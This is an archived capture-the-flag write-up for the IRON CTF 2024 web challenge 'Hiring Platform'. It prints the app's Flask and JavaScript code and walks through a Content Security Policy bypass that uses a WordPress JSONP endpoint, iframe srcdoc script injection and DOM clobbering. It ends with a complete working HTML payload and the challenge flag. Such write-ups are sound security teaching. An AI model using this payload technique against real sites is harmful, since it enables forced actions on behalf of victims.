# Hiring_Platform

**CTF:** IRON 2024  
**Category:** web  
**Original writeup:** <https://abdulhaq.me/blog/iron-ctf-2024/> — by **abdulhaq.me**. All credit goes to the original author; this is an archived copy.

---

Web/Hiring Platform

Handout for the following challenge includes these files

Lets take a look at important files Lets see the app.py

# /*****************/ # Setup and mongodb connection # /*****************/ @app.after_request def set_csp_headers (response): response.headers[ 'Content-Security-Policy' ] = "default-src 'none'; script-src 'self' ; style-src 'self' 'unsafe-inline' ; img-src *;" return response @app.route ( '/register' , methods = [ 'GET' , 'POST' ]) def register (): if 'user' in session: return redirect(url_for( 'profile' )) not_logged_in = True if request.method == 'POST' : name = request.form[ 'name' ] email = request.form[ 'email' ] password = request.form[ 'password' ] interview_code = request.form.get( 'interview_code' ) invite_key = request.form.get( 'invite_code' ) # Check if user with given email already exists if users_collection.find_one({ 'email' : email}): return "User with this email already exists!" if len (password) < 8 : return "Password should be atleast 8 characters." # Hash the password before saving it hashed_password = generate_password_hash(password) # Create a new user document user_data = { 'name' : name, 'email' : email, 'hash_password' : hashed_password, } # Add interview code if provided if interview_code and INVITE_KEY == invite_key : user_data[ 'role' ] = 'recruiter' user_data[ "interview_code" ] = interview_code else : user_data[ 'role' ] = 'human' user_data[ "interview_code" ] = "NONE" # Insert the user into the database users_collection.insert_one(user_data) return redirect(url_for( 'login' )) return render_template( 'register.html' , not_logged_in = not_logged_in) @app.route ( '/recruiter/select' , methods = [ 'POST' ]) def select_human (): print (session) if 'user' in session: try : user_email = b64decode(request.form[ "email" ]).decode() except : return "ERROR decoding email..." admin_user = users_collection.find_one({ 'email' : session[ "user" ]}) if admin_user and admin_user[ 'role' ] == 'recruiter' : if request.method == "POST" : if request.form.get( "remark" ) == "SELECT NOW!!" : selections_collection.insert_one({ 'email' : user_email, 'interview_link' : FLAG }) else : selections_collection.insert_one({ 'email' : user_email, 'interview_link' : admin_user[ "interview_code" ] }) return "Success" else : return "Access denied. Only recruiters can access this page." else : return redirect(url_for( 'login' )) @app.route ( '/portfolio/create' , methods = [ 'GET' , 'POST' ]) def create_portfolio (): if 'user' in session: email = session[ 'user' ] user = users_collection.find_one({ 'email' : email}) if user and user.get( 'role' ) == 'human' : if request.method == 'POST' : session_email = session[ 'user' ] user = users_collection.find_one({ 'email' : session_email}) if user: title = request.form.get( 'title' ) portfolio_content = request.form.get( 'portfolio_content' ) portfolio_collection.insert_one({ 'portfolio_id' :uuid4().hex, 'email' : session_email, 'title' : title, 'portfolio_content' : b64encode(portfolio_content.encode( "utf-8" )).decode( "utf-8" ) }) return redirect(url_for( 'profile' )) else : return "User not found" if 'user' in session: return render_template( 'create_portfolio.html' ) else : return redirect(url_for( 'login' )) else : return redirect(url_for( 'profile' )) else : return redirect(url_for( 'login' ))

In this application, users can register and create portfolios using HTML and CSS, which are displayed on a shareable portfolio page. From the code, we can see that only recruiters have the privilege to shortlist portfolios. The flag can be accessed at the /profile/shortlisted endpoint if a recruiter sends a request to /recruiter/select with the remark parameter set to SELECT NOW!! .

The application enforces a strict Content Security Policy (CSP) to prevent direct XSS attacks. The CSP specifies script-src 'self' , meaning only JavaScript from the same domain can run, but it also allows jsonp . In the description, the /blog page is highlighted, which is a WordPress site. WordPress typically has JSONP endpoints, such as /blog/wp-json/wp/v2/users/1?_jsonp=alert .

// var PRODUCTION = true let portfolio = document. querySelector ( ".portfolio-block" ); portfolio.innerHTML = atob (portfolio.innerHTML) portfolio.classList. remove ( "nodisplay" ); portfolio = document. querySelector ( ".portfolio-block" ); portfolio.innerHTML = portfolio.innerHTML. replace ( / <script \b [ ^ >] * >< \/ script> / gi , "" ) if ( PRODUCTION ) { const formContainer = document. querySelector ( ".selectionForm" ); const user = document. querySelector ( "#email" ).innerHTML formContainer.innerHTML = `<form method="post" action="/recruiter/select" id="select_humans"> <input type="text" name="email" value="${ btoa ( user ) }" hidden> <input type="submit" value="Call for interview"> </form>` }

The recruiter.js file has a regex that strips out script tags, and any HTML entered is applied via innerHTML . Even though script tags can’t be used directly in innerHTML , an XSS attack can be triggered by injecting a script into the srcdoc attribute of an iframe, using a newline between <script> tags ( <script>

</script> ).

Additionally, there’s a variable in recruiter.js initially not set, which can be manipulated by DOM clobbering with an <a id=PRODUCTION> element. This activates production mode and makes the submit button visible. Once the button appears, we can add a remark parameter with the value SELECT NOW!! using an input element, such as <input type="text" name="remark" value="SELECT NOW!!" form="select_humans"> , to send the key-value pair to the form with the ID select_humans .

By using the JSONP endpoint, you can click on the form submit button trigging a request to /recruiter/select , for example:

< iframe srcdoc = " < script src='/blog/wp-json/wp/v2/users/1?_jsonp=window.parent.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.submit'> < /script>" ></ iframe >

If executed correctly, the flag can be retrieved, and there are several ways to achieve this.

Final Payload

< a id = "PRODUCTION" ></ a > < input type = "text" name = "remark" value = "SELECT NOW!!" form = "select_humans" > < iframe srcdoc = " < script src='/blog/wp-json/wp/v2/users/1?_jsonp=window.parent.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.submit'> < /script>" ></ iframe >

This final exploit enables production mode, sets the remark field to SELECT NOW!! for the form with id select_humans , and the script inside the iframe triggers a submission by “clicking” the button.

Once you submit the portfolio to the bot it you will see the flag in /profile/shortlisted endpoint

Flag: ironCTF{c4n_n0t_w4it_t0_hir3_y0u_h4ck3r!!}

Interestingly, this challenge has had three solves. Some players used a CSRF attack to solve it, which also worked because I forgot to implement CSRF protection on the endpoint! :)
